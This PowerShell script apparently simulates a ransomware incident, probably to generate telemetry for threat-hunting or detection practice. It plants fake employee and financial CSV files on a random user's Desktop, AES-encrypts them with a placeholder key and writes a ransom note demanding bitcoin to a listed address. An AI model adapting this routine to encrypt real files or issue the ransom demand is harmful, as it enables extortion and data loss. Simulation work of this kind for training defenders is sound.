 # Define the log file path
$logFilePath = "C:\ProgramData\entropygorilla.log"
$scriptName = "pwncrypt.ps1"

# Function to log messages
function Log-Message {
    param (
        [string]$message,
        [string]$level = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp [$level] [$scriptName] $message"
    Add-Content -Path $logFilePath -Value $logEntry
}

# Start logging
Log-Message "Script execution started."

try {
    # Define encryption key and IV (Initialization Vector) for AES
    $key = [System.Text.Encoding]::UTF8.GetBytes("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") # 32 characters for AES-256
    $iv = [byte[]](1..16) # IV should be 16 bytes for AES

    # Function to encrypt text using AES
    function Encrypt-Text {
        param (
            [string]$plainText,
            [byte[]]$key,
            [byte[]]$iv
        )
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)

        $plainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($plainText)
        $encryptedBytes = $encryptor.TransformFinalBlock($plainTextBytes, 0, $plainTextBytes.Length)

        $aes.Dispose()
        return $encryptedBytes
    }

    Log-Message "Encryption function initialized."

    # Get all potential user directories from C:\Users\
    $usersPath = "C:\Users"
    Log-Message "Attempting to retrieve user directories from $usersPath."
    
    $userDirectories = Get-ChildItem -Directory $usersPath | Where-Object {
        $_.Name -notin @("Public", "Default", "Default User", "All Users", "Administrator")
    }

    # Check if any valid users were found
    if ($userDirectories.Count -eq 0) {
        Log-Message "No valid user directories found in $usersPath." "ERROR"
        throw "No valid user directories found."
    }

    # Select a random user directory
    $randomUser = $userDirectories | Get-Random
    $destFolder = Join-Path $randomUser.FullName "Desktop"
    Log-Message "Selected user: $($randomUser.Name). Desktop folder: $destFolder."

    # Check if the Desktop folder exists for the selected user
    if (-not (Test-Path $destFolder)) {
        Log-Message "Desktop folder not found for user: $($randomUser.Name)" "ERROR"
        throw "Desktop folder not found."
    }

    # Fake company information
    $fakeFiles = @{
        "EmployeeRecords.csv" = "Johnathan Maxwell Doe, Employee ID: 12345, SSN: 123-45-6789, Passport: P1234567, DOB: 02/14/1975, Role: Senior Manager of Global Operations, Address: 123 Elm St, San Francisco, CA. Compensation: 450K + 30% bonus. Notes: Known for negotiation skills, led multiple high-profile acquisitions. Credit Card: 4111-1111-1111-1111 Exp: 12/25 CVV: 123.";
        "ProjectList.csv" = "Project X - Codename: Odyssey Initiative. Est. Completion: 2024-12-31. Scope: Market expansion in Asia-Pacific, targeting 15 countries. Budget: 50M, Risks: Political instability, supply chain issues, whistleblower risks. Secret Legal Settlements: Undisclosed fees for permits.";
        "CompanyFinancials.csv" = "FY2024: Revenue: 150M, Profit: 18.75M. Investments: 20M for data centers, 10M in AI research. Losses: 3.5M ransomware attack. FY2023: Revenue: 120M, Profit: 12M. Internal Audit: Suspicious transactions linked to offshore accounts, pending investigation.";
    }

    # Function to generate a random number to prepend to file names
    function Get-RandomFileName {
        param (
            [string]$fileName
        )
        $randomNumber = Get-Random -Minimum 1000 -Maximum 9999  # Generates a random number between 1000 and 9999
        return "$randomNumber`_$fileName"
    }

    # Clean up existing .pwncrypt files in the Desktop folder
    $existingFiles = Get-ChildItem -Path $destFolder -Filter "*_pwncrypt.csv" -ErrorAction SilentlyContinue
    foreach ($file in $existingFiles) {
        Remove-Item $file.FullName -Force
        Log-Message "Removed existing encrypted file: $($file.FullName)."
    }

    # Create fake text files in the Desktop folder, encrypt them, then delete the originals
    foreach ($file in $fakeFiles.Keys) {
        try {
            # Generate a random file name
            $randomFileName = Get-RandomFileName $file.Replace('.csv', '_pwncrypt.csv')
            $tempFileName = "temp.csv"

            # Define the file path with the random name
            $filePath = Join-Path $destFolder $randomFileName
            $tempPath = Join-Path $destFolder $tempFileName

            # Write the fake company information to the text file
            $fakeContent = $fakeFiles[$file]
            Set-Content -Path $filePath -Value $fakeContent
            Log-Message "Created fake file: $filePath."

            # Encrypt the file content
            $encryptedContent = Encrypt-Text $fakeContent $key $iv

            # Write the encrypted content to the new file
            [System.IO.File]::WriteAllBytes($tempPath, $encryptedContent)

            # Convert the encrypted temp file back into the main file
            (Get-Content -Path $tempPath) | Out-File -FilePath $filePath -Force
            Move-Item -Path $filePath -Destination "C:\Windows\Temp\$($randomFileName)" -Force
            Move-Item -Path "C:\Windows\Temp\$($randomFileName)" -Destination $filePath -Force

            Remove-Item -Path $tempPath
            Log-Message "Encrypted content written to: $filePath."

        } catch {
            Log-Message "An error occurred while processing the file $($file): $($_)" "ERROR"
        }
    }

    # Remove old decryption instructions if they exist
    $decryptionInstructionsPath = Join-Path $destFolder "__________decryption-instructions.txt"
    if (Test-Path -Path $decryptionInstructionsPath) {
        Remove-Item -Path $decryptionInstructionsPath -Force
        Log-Message "Removed old decryption instructions: $decryptionInstructionsPath."
    }

    # Write new decryption instructions in the Desktop folder
    "Your files have been encrypted.`nTo get the decryption key, send \$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1" | Out-File -FilePath $decryptionInstructionsPath -Force
    Log-Message "Decryption instructions written to: $decryptionInstructionsPath."

    Log-Message "Script execution completed successfully."

} catch {
    Log-Message "An error occurred during script execution: $($_)" "ERROR"
}
